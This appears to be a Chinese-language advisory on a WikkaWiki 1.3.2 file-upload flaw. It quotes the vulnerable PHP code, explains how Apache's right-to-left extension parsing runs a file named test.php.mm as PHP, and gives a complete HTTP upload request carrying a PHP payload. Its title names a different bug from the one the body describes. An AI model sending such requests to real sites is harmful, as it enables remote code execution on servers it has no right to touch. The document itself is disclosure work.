# WikkaWiki 1.3.2 Spam Logging PHP Injection
---
先来看下位于 /actions/files/files.php 的这段代码

```
266. elseif (preg_match('/.+\.('.$allowed_extensions.')$/i', $_FILES['file']['name']))
267. {
268. 	$strippedname = str_replace('\'', '', $_FILES['file']['name']);
269. 	$strippedname = rawurlencode($strippedname);
270. 	$strippedname = stripslashes($strippedname);
271. 	$destfile = $upload_path.DIRECTORY_SEPARATOR.$strippedname;
272. }
273. if (!file_exists($destfile))
274. {
275. 	if (move_uploaded_file($_FILES['file']['tmp_name'], $destfile))
276. 	{
277. 		$notification_msg = T_("File was successfully uploaded.");
278. 	}
...
```

在"INTRANET_MODE"开启或者攻击者利用CVE-2011-4448漏洞成功实施会话劫持攻击，攻击者可以上传包含多个扩展名的文件。

代码第266行的$allowed_extensions定义如下：

```
gif|jpeg|jpg|jpe|png|doc|xls|csv|ppt|ppz|pps|pot|pdf|asc|txt|zip|gtar|g
z|bz2|tar|rar|vpp|mpp|vsd|mm|htm|htm
```

像mm、vpp等扩展名在Apache中的mime.types中是非常少见的。

在Apache 1.x、2.x中，apache对文件名的解析是从后往前解析的，直到遇到一个Apache认识的文件类型为止。

所以上传一个test.php.mm，对于Apache来说会从后一直历遍后缀到.php，然后认为是个php类型的文件。

现在来看攻击过程

假设test这个页面是包含了files.php的，构造以下请求

```
POST /wikka/test HTTP/1.1
Host: localhost
Cookie: 96522b217a86eca82f6d72ef88c4c7f4=upjhsdd5rtc0ib55gv36l0jdt3
Content-Length: 251
Content-Type: multipart/form-data; boundary=--------1503534127
Connection: keep-alive

----------1503534127
Content-Disposition: form-data; name="file"; filename="test.php.mm"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
----------1503534127
Content-Disposition: form-data; name="upload"

Upload
----------1503534127--
```